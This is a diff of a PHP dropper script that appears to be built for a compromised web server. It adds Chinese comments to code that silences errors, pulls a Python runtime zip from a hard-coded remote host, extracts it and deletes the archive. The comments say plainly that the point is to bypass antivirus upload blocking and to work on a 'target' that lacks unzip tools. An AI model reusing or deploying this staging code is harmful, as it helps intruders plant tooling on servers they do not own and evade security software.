@@ -48,6 +48,9 @@ function setDownloaded(fsize) {
 error_reporting(0);
 ob_start();
 @set_time_limit(300);
+  
+ //下载请修改下面$url参数 再次强调不支持ssl 所以需要去官方下载到自己的服务器上再下载 这样做的目的是绕过一些AV禁止上传文件的行为
+
 $url="http://www.gzdata.net.cn/tmp/python-3.7.2.post1-embed-win32.zip";
 $newfname="py.zip";
 $file = fopen ($url, "rb");
@@ -131,6 +134,8 @@ class Unzip{
     }
 }
 
+  
+//解压目录设置 Python需切到该目录来运行 下载Get-pip.py时可不修改该参数 这样做的意义时避免目标上无解压工具再麻烦
 $z = new Unzip();
 if($z->unzip("py.zip",'./py/', true, false)){
     echo <<< EOT
@@ -144,6 +149,7 @@ if($z->unzip("py.zip",'./py/', true, false)){
 EOT;
 }
 
+//清理py的压缩包 
 if(unlink("./py.zip")){
     echo <<< EOT
 
